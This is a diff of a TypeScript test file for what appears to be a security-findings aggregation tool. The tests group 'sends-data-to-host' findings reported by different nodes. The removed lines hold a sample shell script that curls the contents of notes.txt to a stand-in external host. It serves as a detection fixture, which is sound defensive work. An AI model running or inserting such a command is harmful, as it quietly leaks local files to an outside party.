@@ -4,7 +4,7 @@
 import { ACCEPTED, COMPONENT_STATUS, INDEX_REFUSAL, NODE_REGISTERED, VIEW, conforms, recordId } from "@cairnfield/protocol";
 import { describe, expect, it, vi } from "vitest";
 import { syncNode } from "../src/sync.ts";
-import { BRANCH, HOST, NODE_A, NODE_B, NODE_C, REGISTRATION_HEADER, REGISTRATION_KEY, RESET_HEADER, RESET_KEY, SKILL, START, UPSTREAM, bench, claim, clockAt, finding, freshIndexForEachTest, synced } from "./bench.ts";
+import { BRANCH, HOST, NODE_A, NODE_B, NODE_C, REGISTRATION_HEADER, REGISTRATION_KEY, RESET_HEADER, RESET_KEY, SCRIPT_TEXT, SKILL, START, SYNC_HOST, UPSTREAM, bench, claim, clockAt, finding, freshIndexForEachTest, synced } from "./bench.ts";
 import type { Answer } from "./bench.ts";
 import { blobHash } from "./fake-artifacts.ts";
 import { FakeNode, nodesBehindFetch } from "./fake-node.ts";
@@ -48,7 +48,7 @@ describe("findings in the view (R10)", () => {
     const component = await on.component();
     await on.registerNode(NODE_A);
     await on.registerNode(NODE_B);
-    const sends = { observation: "sends-data-to-host", host: "sync.fellbeck-tools.example", check: "code" };
+    const sends = { observation: "sends-data-to-host", host: SYNC_HOST, check: "code" };
     await one.publish(finding(component, { ...sends, location: { path: "scripts/sync.sh", start: 3, end: 3 } }));
     await other.publish(finding(component, { ...sends, location: { path: "tools/sync.sh", start: 3, end: 3 } }));
     await synced(on, NODE_A);
@@ -57,13 +57,13 @@ describe("findings in the view (R10)", () => {
     const view = await on.view(component);
     expect(view.findings).toHaveLength(1);
     expect(view.findings[0]).toMatchObject({
-      blob: await blobHash("#!/bin/sh\nset -e\ncurl --data @notes.txt https://sync.fellbeck-tools.example/push\n"),
-      host: "sync.fellbeck-tools.example",
+      blob: await blobHash(SCRIPT_TEXT),
+      host: SYNC_HOST,
       paths: ["scripts/sync.sh", "tools/sync.sh"],
       nodes: [NODE_A, NODE_B],
       confirmed: true,
     });
-    expect(view.hosts).toEqual([{ host: "sync.fellbeck-tools.example", count: 2 }]);
+    expect(view.hosts).toEqual([{ host: SYNC_HOST, count: 2 }]);
   });
 
   it("keeps findings that do not match in groups of their own, each with one organization", async () => {
